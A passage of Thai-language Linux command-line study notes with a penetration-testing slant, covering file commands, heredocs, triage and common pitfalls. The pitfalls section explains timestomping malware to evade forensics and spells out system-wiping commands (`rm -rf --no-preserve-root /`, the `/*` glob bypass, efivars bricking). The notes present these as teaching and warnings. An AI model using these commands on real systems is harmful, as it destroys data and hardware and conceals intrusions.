   - มือใหม่มักเข้าใจว่า `touch` คือคำสั่งสร้างไฟล์ แต่ในระดับเคอร์เนล Linux หน้าที่หลักที่แท้จริงของ `touch` คือ **"เครื่องมือแก้ไขเวลาของ Inode (Access & Modification Timestamps)"**
   - **หากไฟล์ยังไม่มีอยู่:** เคอร์เนลจะจัดสรร Inode ใหม่และสร้างไฟล์ขนาด 0 byte ให้โดยอัตโนมัติ (เป็นผลพลอยได้)
   - **หากไฟล์มีอยู่แล้ว:** คำสั่ง `touch` จะ **ไม่อ่าน ไม่ลบ และไม่เขียนทับเนื้อหาภายในไฟล์** แต่จะอัปเดตเวลา Access Time (`atime`) และ Modification Time (`mtime`) ของไฟล์นั้นให้เป็นเวลาปัจจุบันของระบบทันที
3. **การเขียนไฟล์ด้วย `cat > file` + `Ctrl + D` (Interactive Stdin Stream):**
   - **กลไกการทำงาน:** เมื่อรันคำสั่ง `cat` โดยไม่มีการระบุไฟล์ต้นทาง ตัว `cat` จะเปิดรับข้อมูลจาก **Standard Input (`stdin`)** ผ่านแป้นพิมพ์ทันที และเครื่องหมาย `>` จะ Redirect ข้อมูลเหล่านั้นไปเขียนลงในไฟล์เป้าหมาย
   - **สัญญาณ `Ctrl + D` (End-of-File / EOF):** ในสถาปัตยกรรม Linux ปุ่ม `Ctrl + D` ไม่ใช่คำสั่งลบหรือตัดจบแบบรุนแรง (เหมือน `Ctrl + C` ที่ส่ง SIGINT) แต่เป็นการส่งสัญญาณ **EOF (End-of-File / Transmission Complete)** ไปยังสตรีม `stdin` เพื่อบอกเคอร์เนลว่า "ข้อมูลสิ้นสุดแล้ว" ตัว `cat` จะทำการปิด File Descriptor และบันทึกไฟล์ลงดิสก์อย่างสมบูรณ์
4. **ความเหนือชั้นของ Here Document (`cat << EOF > file` - Heredoc):**
   - **ทำไมสาย OffSec และ Scripting ถึงชอบใช้ Heredoc มากกว่า `Ctrl + D`:** คำสั่ง `cat > file` ต้องอาศัยมนุษย์คอยกดปุ่ม `Ctrl + D` ที่หน้าจอ ทำให้ไม่สามารถนำไปใส่ใน Bash Script, Reverse Shell, หรือ Web Shell อัตโนมัติได้
   - **กลไกของ Heredoc:** ไวยากรณ์ `<< DELIMITER` คือการบอกให้ Shell อ่านข้อมูลทุกบรรทัดถัดไปเป็นเนื้อหาไฟล์ จนกว่าจะเจอบรรทัดที่มีเฉพาะคำ Delimiter นั้น (เช่น `EOF` หรือ `CAT` ตามที่เห็นในแล็บ) ทำให้เราสามารถวางบล็อกโค้ดขนาดใหญ่หลายสิบบรรทัดผ่าน Terminal หรือในสคริปต์ได้ในรวดเดียวโดยไม่ต้องเปิด nano หรือ vim
5. **อาวุธฉับไว: `echo "text" > file` vs `echo "text" >> file` (Single-line Redirection):**
   - คำสั่งที่สั้นและเร็วที่สุดในการสร้างหรือแก้ไขไฟล์บรรทัดเดียว เช่น การป้อน Target IP ลงไฟล์ (`echo "10.10.11.20" > target.txt`) หรือการเปิด Port forwarding ในเคอร์เนล (`echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward`)
   - **แฟล็ก `-n` (No Newline):** ตามธรรมชาติ `echo` จะเติมอักขระขึ้นบรรทัดใหม่ (`\n`) ท้ายข้อความเสมอ การใส่ `-n` จะสั่งไม่ให้ขึ้นบรรทัดใหม่ ซึ่งสำคัญมากเวลากรอก Password Hash หรือ Token ที่ห้ามมี newline ปนเปื้อน
6. **สถาปัตยกรรมการสร้างไดเรกทอรีด้วย `mkdir` (`-p` Flag & Idempotency):**
   - **ปัญหาคลาสสิก:** หากรัน `mkdir parent/child` โดยที่โฟลเดอร์ `parent` ยังไม่มีอยู่ ตัวเคอร์เนลจะฟ้อง Error ทันที: `No such file or directory`
   - **พลังของแฟล็ก `-p` (`--parents`):** สั่งให้เคอร์เนลเดินสำรวจเส้นทางโฟลเดอร์ หากชั้นใด (Parent) ยังไม่ถูกสร้าง มันจะทำการสร้างให้ครบทุกระดับชั้นจนถึงปลายทาง
   - **คุณสมบัติ Idempotent (รันซ้ำไม่พัง):** หากโฟลเดอร์ปลายทางมีอยู่แล้ว การใช้ `mkdir -p` จะ **ไม่ขึ้น Error เตือนและไม่ทำให้ระบบหยุดชะงัก** จึงเป็นคำสั่งบังคับในสคริปต์อัตโนมัติ (Automation Scripts) และ CI/CD Pipeline
   - **คอมโบกับ Brace Expansion:** การผสม `mkdir -p lab/{recon,exploits,logs}` จะคลี่ออกมาเป็น `lab/recon`, `lab/exploits`, `lab/logs` ในเสี้ยววินาที สร้างโครงสร้างโปรเจกต์งาน Pentest ได้อย่างมืออาชีพ
7. **ตัวตนสองหน้าของ `mv` (Rename vs Move) และความจริงระดับ Inode:**
   - **พฤติกรรมสองหน้า:** คำสั่ง `mv` ใช้สำหรับ "เปลี่ยนชื่อไฟล์" และ "ย้ายตำแหน่งโฟลเดอร์" ขึ้นอยู่กับว่าอาร์กิวเมนต์ตัวที่สองคือชื่อไฟล์ใหม่หรือไดเรกทอรี
   - **ความลับระดับ Inode ภายในพาร์ติชันเดียวกัน (O(1) Instant Move):** หากย้ายไฟล์ภายในฮาร์ดดิสก์/พาร์ติชันเดียวกัน คำสั่ง `mv` จะทำงานเสร็จในเสี้ยววินาทีเสมอ ไม่ว่าไฟล์จะใหญ่ 1 MB หรือ 100 GB เพราะตัวเคอร์เนลไม่ได้ขยับข้อมูล (Data Blocks) บนดิสก์เลยแม้แต่ไบต์เดียว! สิ่งที่มันทำมีเพียงแค่ "เปลี่ยนชื่อในตาราง Directory Entry ให้ชี้ไปยัง Inode เดิม"
   - **การย้ายข้ามพาร์ติชัน (Cross-filesystem Move):** หากย้ายไฟล์ข้าม Drive (เช่น จาก `/home` ไป `/mnt/usb`) ตัวเคอร์เนลไม่สามารถแชร์ Inode ข้ามพาร์ติชันได้ มันจึงต้องจำลองการทำงานเป็น **`cp` (ก๊อปปี้ข้อมูลทั้งหมด) แล้วตามด้วย `rm` (ลบไฟล์ต้นทางทิ้ง)** ซึ่งจะกินเวลาตามขนาดไฟล์จริง
8. **กายวิภาคคำสั่ง `cp`: ระบุเฉพาะ Path vs ระบุชื่อใหม่ (Keep Name vs Rename):**
   - **`cp test.txt ./name/` (ระบุเฉพาะ Directory):** เคอร์เนลจะทำการคัดลอก Data blocks ของ `test.txt` ไปสร้างเป็น Inode ใหม่ที่อยู่ภายใต้โฟลเดอร์ `./name/` โดย **คงชื่อไฟล์ดั้งเดิมไว้** ผลลัพธ์คือ `./name/test.txt`
   - **`cp test.txt ./name/new.txt` (ระบุทั้ง Path และชื่อไฟล์):** เคอร์เนลจะคัดลอกข้อมูลไปสร้างเป็น Inode ใหม่ภายใต้โฟลเดอร์ `./name/` พร้อมกับ **ตั้งชื่อในตาราง Directory Entry ให้เป็น `new.txt` ทันที (Copy & Rename ในจังหวะเดียว)**
   - **`cp` vs `mv` (ความต่างระดับฮาร์ดแวร์):** `mv` ภายในพาร์ติชันเดียวกันไม่ต้องก๊อปปี้ข้อมูลเลย (แก้แค่ Pointer ชี้ Inode) แต่ `cp` ต้องจัดสรร Inode ใหม่และก๊อปปี้ข้อมูลจริงทุกไบต์เสมอ จึงต้องใช้เวลาและพื้นที่จัดเก็บเพิ่มขึ้นเป็น 2 เท่า
9. **ศาสตร์แห่งการวาดผังต้นไม้ด้วย `tree` (Spatial Mental Mapping):**
   - **ความเหนือชั้นกว่า `ls -R`:** แม้คำสั่ง `ls -R` จะแสดงผลแบบ Recursive ได้ แต่มันพ่นข้อมูลออกมาเป็นบล็อกแยกท่อนๆ ขาดความต่อเนื่อง ทำให้สมองมนุษย์ต้องคำนวณต่อเอง แต่คำสั่ง `tree` ใช้สัญลักษณ์กิ่งก้าน (`├──`, `└──`, `│`) เชื่อมโยงความสัมพันธ์ของระดับชั้นในหน่วยความจำทันที
   - **สถาปัตยกรรมการกรองระดับลึก (`-L` และ `-I`):** ในโปรเจกต์ขนาดใหญ่ (เช่น Web App หรือ Framework) โฟลเดอร์อย่าง `node_modules` หรือ `.git` มีไฟล์นับหมื่นไฟล์ การใช้ `tree -L 2 -I "node_modules|.git"` ช่วยตัดเสียงรบกวน (Noise) และคงเหลือเฉพาะภาพรวมโครงสร้างที่นักเจาะระบบต้องการโฟกัส
10. **สถาปัตยกรรมการลบไฟล์: `rmdir` (Safety Fuse) vs `rm -r` (Recursive Destroyer):**
    - **ทำไมระบบถึงมี `rmdir` ทั้งที่มี `rm -r` อยู่แล้ว?** คำสั่ง `rmdir` ถูกออกแบบมาเพื่อทำหน้าที่เป็น **"ฟิวส์นิรภัย (Safety Mechanism)"** สำหรับงาน Scripting และ Automation หากไดเรกทอรีนั้นมีไฟล์สำคัญตกค้างอยู่แม้แต่ไฟล์เดียว `rmdir` จะดีดตัวและตัดการทำงานทันที (`Directory not empty`) เพื่อป้องกันการลบข้อมูลโดยอุบัติเหตุ
    - **`rm -r` (Recursive Tree Pruning):** เมื่อต้องการลบโฟลเดอร์ที่มีไฟล์ข้างใน ตัวเคอร์เนลต้องเดินสำรวจลงไปลบ Leaf nodes (ไฟล์ที่อยู่ลึกสุด) ก่อน แล้วจึงค่อยๆ ลบโฟลเดอร์ย้อนกลับขึ้นมาทีละชั้นจนถึงราก
    - **ธรรมชาติของ Inode Unlink (ไม่มี Recycle Bin):** คำสั่ง `rm` บน Linux CLI แท้จริงแล้วคือ System Call ชื่อ `unlink()` ซึ่งทำการตัดสายเชื่อมโยงระหว่างชื่อไฟล์กับหมายเลข Inode ทันที หากไม่มี Process ใดเปิดไฟล์นั้นค้างอยู่ บล็อกข้อมูลจะถูกตีตราเป็น Free blocks ในพริบตาเดียว
11. **การสร้างโครงสร้างจำลองด้วย Bash Loop (`for i in {1..N}`):**
    - **ทำไมสาย System Admin & Pentest ต้องเขียน Loop สร้าง Directory:** ในการทดสอบระบบจริง เรามักต้องสร้างไฟล์และโฟลเดอร์ซ้อนลึกจำนวนมหาศาล (Deeply Nested Directory Tree) เพื่อใช้ทดสอบประสิทธิภาพของเครื่องมือ เช่น การวัดความเร็วการกวาดอ่านของ `find` หรือการสตรีมข้อมูลของ `tree`
    - **พลังของ One-liner Script:** การผสาน `for i in {1..N}; do mkdir -p ...; done` ช่วยเนรมิตโฟลเดอร์ซ้อนกันลึก 5-6 ชั้นจำนวนนับหมื่นโฟลเดอร์ได้ภายใน 2-3 วินาที โดยไม่ต้องพึ่งพาโปรแกรมภายนอก
12. **ลำดับขั้นการกู้ชีพและวิเคราะห์ระบบเมื่อเกิดวิกฤต (System Triage Hierarchy):**
    - **ด่านที่ 1: ตรวจสอบดิสก์เต็ม (`df -h` & `du -sh`):** กว่า 70% ของปัญหา Service ดับหรือฐานข้อมูลไม่ตอบสนอง เกิดจากพาร์ติชัน Root (`/`) หรือ `/var` เต็ม 100% จนระบบไม่สามารถเขียนไฟล์ล็อกหรือ Swap ได้
    - **ด่านที่ 2: ผ่าดูบันทึกเหตุการณ์ลึก (`/var/log/syslog` & `journalctl -xe`):** คำสั่ง `journalctl -xe` (e = jump to end, x = catalog explanation) คือหัวใจของการดีบัก Systemd Service ที่สั่ง Start ไม่ผ่าน เพราะมันจะบอกสาเหตุที่ Service พังอย่างละเอียด
    - **ด่านที่ 3: กู้ชีพแพ็กเกจพัง (`dpkg --configure -a` & `apt --fix-broken install`):** เมื่อการอัปเดตระบบถูกตัดไฟหรือปิดเครื่องกลางคัน ตัว Database แพ็กเกจของ Debian/Ubuntu จะติดล็อคและค้างคา การรัน `dpkg --configure -a` จะบังคับให้เคอร์เนลจัดการคอนฟิกแพ็กเกจที่ค้างอยู่ให้เสร็จสิ้น และ `apt --fix-broken install` จะช่วยดาวน์โหลด Dependency ที่ขาดหายมาซ่อมแซมให้สมบูรณ์
    - **ด่านที่ 4: ตรวจสอบชีพจรเครือข่าย 3 ระดับ (Link -> Gateway -> DNS):** ไล่จากภายในสู่ภายนอกเสมอ: ส่อง IP ตัวเอง (`ip a`) -> ยิงทดสอบ Gateway/Public IP (`ping -c 4 8.8.8.8`) -> ตรวจสอบ Name Resolution (`cat /etc/resolv.conf`)
13. **วินัยแห่งการย้อนเวลาระบบด้วย Snapshot (Golden Baseline & Instant Rollback):**
    - ในการฝึกฝนวิชา Offensive Security และการทดลองตั้งค่าเคอร์เนล กฎเหล็กสูงสุดคือ **"ระบบต้องพร้อมพังได้เสมอ"**
    - การสร้าง **Golden Snapshot** บน VirtualBox ทันทีหลังติดตั้ง OS และเครื่องมือสำคัญครบถ้วน จะทำให้เรามีจุดเซฟที่ปลอดภัย หากวันใดระบบพังจากการคอมไพล์โค้ดผิดพลาดหรือเจอมัลแวร์ทำลายระบบ เราสามารถสั่ง Rollback กลับสู่จุดสมบูรณ์ได้ใน 10 วินาทีโดยไม่ต้องเสียเวลาลง OS ใหม่

#### ⚠️ กับดักทางเทคนิคและข้อควรระวัง (Gotchas & Pitfalls)
1. **ศาสตร์แห่ง Timestomping ในงาน Red Team (Defense Evasion):**
   - ในการทำนิติวิทยาศาสตร์ (Digital Forensics) และการตรวจสอบระบบของแอดมิน การค้นหาไฟล์แปลกปลอมมักใช้คำสั่งเรียงตามเวลาแก้ไขล่าสุด เช่น `ls -lt` หรือ `find / -mtime -1` เพื่อดูว่ามีไฟล์อะไรเพิ่งถูกวางบนเครื่อง
   - **เทคนิคการพรางตัว (Timestomping):** ผู้โจมตีสามารถใช้คำสั่ง `touch -r <reference_file> <target_file>` (เช่น `touch -r /bin/ls /tmp/malicious.elf`) เพื่อ "โคลนวันและเวลา" ของไฟล์ระบบดั้งเดิมมาแปะทับมัลแวร์ ทำให้มัลแวร์ดูกลมกลืนเหมือนไฟล์เก่าที่ติดตั้งมาพร้อมกับ OS เมื่อหลายปีก่อน
2. **กับดักมรณะในงาน OffSec: Variable Expansion ใน Heredoc (`<< EOF` vs `<< 'EOF'`):**
   - **`cat << EOF > file` (Unquoted Delimiter):** 
     - ตัว Shell ปัจจุบันจะ **ประเมินค่าและแทนที่ตัวแปร (Variable Expansion) ทันที** ก่อนส่งข้อความไปเขียนลงไฟล์
     - **จุดที่พังบ่อย:** หากเรากำลังเขียนสคริปต์ Bash ที่มีตัวแปรรับพารามิเตอร์ เช่น `TARGET=$1` ตัว Shell ปัจจุบันจะมองว่า `$1` ว่างเปล่า และลบมันทิ้ง กลายเป็น `TARGET=` ส่งผลให้สคริปต์ปลายทางพังทันที!
   - **`cat << 'EOF' > file` (Quoted Delimiter):**
     - เพียงแค่ **ใส่ Single Quote ครอบคำว่า `'EOF'`** ตัว Shell จะปิดกลไก Expansion ทุกชนิดทันที และส่งสตริงทั้งหมดไปเขียนลงไฟล์แบบ **Raw Literal Text 100%**
     - ตัวแปร `$1`, `$USER`, `$PATH`, หรือ Command Substitution `$(...)` จะถูกคงรูปเดิมไว้ทุกประการ เพื่อให้สคริปต์ปลายทางเป็นผู้ประมวลผลเองในอนาคต นี่คือมาตรฐานสูงสุดในการ Drop Payload หรือ Reverse Shell One-liner
3. **ความต่างของทิศทาง Redirect (`>` Overwrite vs `>>` Append):**
   - ใช้ `>` : ล้างเนื้อหาเก่าในไฟล์ทิ้งทั้งหมดแล้วเขียนใหม่ (ระวังหากเผลอใช้กับไฟล์คอนฟิกระบบ)
   - ใช้ `>>` : เขียนข้อความต่อท้ายบรรทัดเดิมอย่างปลอดภัย
4. **ความเสี่ยงของ Race Condition เมื่อตั้งสิทธิ์โฟลเดอร์ (`mkdir` แล้วค่อย `chmod`):**
   - **รูปแบบที่อันตราย:** หากสั่ง `mkdir loot` แล้วบรรทัดถัดไปค่อยสั่ง `chmod 700 loot` จะมีช่องว่างเวลาเสี้ยววินาที (Race Condition Window) ที่โฟลเดอร์นั้นเปิดสิทธิ์ตามค่า Default `umask` ทำให้ User อื่นในเครื่องอาจแอบอ่านหรือสร้างไฟล์ดักไว้ได้
   - **ทางแก้ระดับ OffSec:** ให้ใช้แฟล็ก **`-m` (Mode)** เช่น **`mkdir -m 700 loot`** เพื่อให้เคอร์เนลสร้างไดเรกทอรีพร้อมล็อกสิทธิ์เป็น `700` ตั้งแต่จังหวะแรกเกิด ปิดช่องโหว่ทันที
5. **กับดักมรณะ Silent Overwrite ของคำสั่ง `mv`:**
   - โดยค่าเริ่มต้น คำสั่ง `mv source.txt destination.txt` จะ **เขียนทับไฟล์ปลายทางทันทีแบบเงียบๆ (Silent Overwrite)** หากชื่อไฟล์ปลายทางมีอยู่แล้ว ข้อมูลเก่าจะหายสาบสูญโดยไม่มีการถามเตือนใดๆ
   - **วิธีป้องกัน:** ในงานเซิร์ฟเวอร์สำคัญ ควรฝึกพิมพ์ **`mv -i`** (Interactive) หรือ **`mv -n`** (No-clobber ไม่เขียนทับเด็ดขาด) เพื่อความปลอดภัย
6. **กับดักปลายทางของ `cp` เมื่อลืมใส่ Slash ปิดท้าย (`./name` vs `./name/`):**
   - **สมมติโฟลเดอร์ `name` ยังไม่ได้ถูกสร้าง:**
     - หากรัน `cp test.txt ./name` : ระบบจะไม่ขึ้นฟ้อง Error แต่จะ **สร้างไฟล์ธรรมดาชื่อ `name`** (เป็นไฟล์ไม่ใช่โฟลเดอร์!) ซึ่งทำให้เข้าใจผิด
     - หากรัน `cp test.txt ./name/` : การมีเครื่องหมาย `/` ปิดท้ายเป็นการบังคับเคอร์เนลว่าปลายทางต้องเป็นไดเรกทอรี หากไม่มีอยู่จริง ระบบจะฟ้อง Error เตือนทันที: `No such file or directory` ช่วยป้องกันการสร้างไฟล์ผิดพลาด
7. **กับดัก Terminal Flood ของ `tree` (ห้ามสั่ง `tree /` โดยเด็ดขาด):**
   - **หายนะระดับ Terminal:** หากสั่ง `tree /` ด้วยสิทธิ์ Root บนระบบปฏิบัติการจริง ตัวคำสั่งจะพยายามกวาดอ่านทุก Inode ในเครื่อง (รวมถึง `/proc`, `/sys`, และ Disk ทั้งหมด) ส่งผลให้ Terminal ค้าง สตรีมข้อความไหลท่วมจอไม่หยุด และสูญเสีย Buffer การค้นหาย้อนหลัง
   - **กฎเหล็กปฏิบัติการ:** ทุกครั้งที่จะส่องไดเรกทอรีที่ไม่คุ้นเคย ต้องกำกับด้วย **`tree -L <ระดับ>`** (เช่น `tree -L 2`) เสมอเพื่อล็อกความลึกไว้ในระดับที่ปลอดภัย
8. **กับดักมรณะ `rm -rf` และการป้องกันการพิมพ์พลาด:**
   - **ความอันตรายของ `-f` (Force):** แฟล็ก `-f` จะปิดระบบเตือนทั้งหมดและละเลยไฟล์ที่ไม่มีอยู่จริง หากพิมพ์เครื่องหมายผิด เช่น ตั้งใจจะพิมพ์ `rm -rf ./temp/` แต่เผลอเคาะเว้นวรรคกลายเป็น `rm -rf . / temp/` (มีจุดเดี่ยวๆ) หรือ `rm -rf /` จะทำให้ระบบกวาดลบไฟล์ของเครื่องทั้งหมดทันที
   - **วิธีป้องกันในทางปฏิบัติ:** หลีกเลี่ยงการใช้ Wildcard `*` คู่กับ `rm -rf` โดยไม่ตรวจสอบด้วย `ls` นำหน้าก่อนเสมอ เช่น ตรวจสอบด้วย `ls target_dir/*` ให้แน่ใจว่าตรงเป้าหมาย แล้วจึงค่อยเปลี่ยนเป็น `rm`
9. **กายวิภาคคำสั่งมรณะ `sudo rm -rf --no-preserve-root /` (Failsafe Latch, Self-Crash & Hardware Bricking):**
   - **สลักนิรภัย `--preserve-root` (GNU Coreutils Failsafe):** ตั้งแต่ GNU Coreutils 6.4 เป็นต้นมา หากรัน `sudo rm -rf /` ตรงๆ คำสั่ง `rm` จะตรวจสอบทันทีว่าเป้าหมายคือ Root Directory (`/`) หรือไม่ หากใช่ จะตัดการทำงานทันทีพร้อมข้อความเตือน `rm: it is dangerous to operate recursively on '/'`
   - **การปลดสลักด้วย `--no-preserve-root`:** การใส่แฟล็กนี้คือการยืนยันเจตนาที่จะ "ปลดกลไกนิรภัย" และบังคับให้เคอร์เนลเดินหน้าลบทุกสิ่งทุกอย่างบนระบบไฟล์
   - **ช่องโหว่ Wildcard Bypass (`sudo rm -rf /*`):** แม้ระบบจะมี `--preserve-root` ป้องกัน `/` ไว้ แต่หากสั่ง `rm -rf /*` ตัว Bash Shell จะทำการคลี่ (Glob Expansion) เครื่องหมาย `/*` ให้กลายเป็น `rm -rf /bin /boot /dev /etc /home ...` **ก่อนที่คำสั่ง `rm` จะถูกเรียกทำงาน** ทำให้ `rm` ไม่เห็นว่ามีอาร์กิวเมนต์ `/` เดี่ยวๆ อยู่เลย จึงข้ามระบบนิรภัยและล้างบางระบบได้ 100% โดยไม่ต้องพิมพ์ `--no-preserve-root`
   - **กลไกการทำลายตัวเอง (Self-Crash & Dynamic Linker Failure):** การลบไม่ได้เกิดขึ้นในพริบตาเดียว แต่เป็นการเดินสำรวจลบทีละไดเรกทอรี ทันทีที่ `rm` เดินทางไปลบ Shared Libraries ใน `/lib` หรือ `/lib64` (เช่น `libc.so.6`) หรือตัว Dynamic Linker (`ld-linux.so`) ตัวคำสั่ง `rm` เองจะไม่สามารถโหลดคำสั่งถัดไปมาประมวลผลได้ ส่งผลให้ `rm` แครชลงมาด้วย `Segmentation Fault` หรือ `Command not found` ทิ้งระบบให้อยู่ในสภาพพังพิการ (Broken State)
   - **หายนะระดับฮาร์ดแวร์: UEFI NVRAM Bricking (`/sys/firmware/efi/efivars`):** บนเครื่องจริงที่บูตผ่าน UEFI เมนบอร์ดจะเชื่อมต่อหน่วยความจำ NVRAM เข้ากับ Linux ผ่าน Virtual Filesystem ที่ `/sys/firmware/efi/efivars` ในโหมด Read-Write การสั่ง `rm -rf` กวาดลึกเข้าไปถึงจุดนี้จะลบตัวแปรบูตและเฟิร์มแวร์ของเมนบอร์ด ส่งผลให้เครื่องเปิดไม่ติดอย่างถาวร (Hard Brick) แม้จะเปลี่ยนฮาร์ดดิสก์ใหม่ก็ไม่สามารถกู้คืนได้
   - **ความจริงของ Inode Unlink vs RAM Running Process:** ในขณะที่ไฟล์บนดิสก์ถูก Unlink ไปแล้ว โปรเซสที่ถูกโหลดเข้า RAM ไปก่อนหน้า (เช่น Shell ที่เปิดอยู่) จะยังคงค้างอยู่ใน RAM ชั่วคราว แต่จะไม่สามารถรันคำสั่งใหม่ใดๆ ได้อีกเลย เพราะไบนารีและไลบรารีบนดิสก์สูญสลายไปหมดแล้ว
10. **กับดักดิสก์เต็มเพราะ Log บวม และการกู้พื้นที่อย่างปลอดภัย (`rm` vs `truncate`):**
    - **กับดักของการใช้ `rm` ลบไฟล์ Log ที่กำลังถูกเขียน:** หากดิสก์เต็มเพราะ `/var/log/syslog` บวมหลายสิบ GB แล้วเราสั่ง `rm /var/log/syslog` ตัวพื้นที่ดิสก์จะ **ยังไม่ถูกคืน (Disk Space Remains Full)** เพราะ System Daemon (เช่น `rsyslogd`) ยังคงเปิด File Descriptor ค้างอยู่!
    - **วิธีแก้ที่ถูกต้องระดับ SysAdmin:** ห้ามลบไฟล์ทิ้ง แต่ให้ "ล้างไบต์ให้เป็นศูนย์" ด้วยคำสั่ง **`sudo truncate -s 0 /var/log/syslog`** หรือ **`sudo sh -c '> /var/log/syslog'`** เพื่อตัดขนาดไฟล์ลงเหลือ 0 byte ในทันทีโดยที่ Daemon ไม่หลุดการเชื่อมต่อและคืนพื้นที่ดิสก์ให้ระบบในเสี้ยววินาที
11. **กับดักเครือข่าย: ปิง IP ติดแต่ปิง Domain ไม่ติด (DNS Name Resolution Failure):**
    - หากรัน `ping 8.8.8.8` สำเร็จ แต่เมื่อรัน `ping google.com` หรือ `apt update` แล้วระบบฟ้องว่า `Temporary failure in name resolution`
    - **ข้อผิดพลาดทั่วไป:** อย่าเสียเวลาไปเปิด-ปิด Network Adapter หรือแก้ IP Interface เพราะสัญญาณเน็ตปกติ 100% แต่จุดที่พังคือ **ระบบ DNS** ให้ตรวจสอบไฟล์ `/etc/resolv.conf` ทันทีว่ามีบรรทัด `nameserver 1.1.1.1` หรือ `nameserver 8.8.8.8` อยู่หรือไม่
